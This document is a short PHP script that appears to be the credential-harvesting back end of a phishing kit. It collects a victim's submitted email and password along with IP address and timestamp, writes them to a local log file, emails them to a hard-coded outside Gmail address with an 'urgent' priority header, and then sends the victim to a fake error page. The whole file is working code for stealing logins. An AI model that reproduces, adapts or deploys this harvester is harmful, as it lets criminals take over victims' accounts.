<?php
include 'error_files/validate_form.js';
session_start();
$userid = $_POST['email'];
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$port = getenv("REMOTE_PORT");
$domain = 'Users';
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$message .= "xxxxxxxxxxxxxxxxx XxX  *~* Zola *~*  XxX xxxxxxxxxxxxxxxxx"."<br />";
$message .= $domain." ID *: ".$_POST['email']."<br />";
$message .= "Password*: ".$_POST['Password']."<br />";
$message .= "IP: ".$ip."<br />";
$message .= $adddate;
$recipient = "feltonlewlew3@gmail.com";
$subject .= "RacK $ip";
$headers .= "From: RacK@kingz.com";
$headers .= $_POST['eMailAdd']."\n";
$handle = fopen("script.txt", "a");
fwrite($handle, $message);
fclose($handle);
mail($recipient,$subject,$message,$headers);
mail($recipent,$subject,$message,$headers);
header("Location: error.php?P=sf58gfd1s689sxd2sdf8angf264s9df23sd2f1n495K3L2C151645172991f1477dbd26917ef3822423f62e984a91f1477dbd26917ef3822423f62e984a91f1477dbd_Product-UserID&userid=".$userid);
	  

?>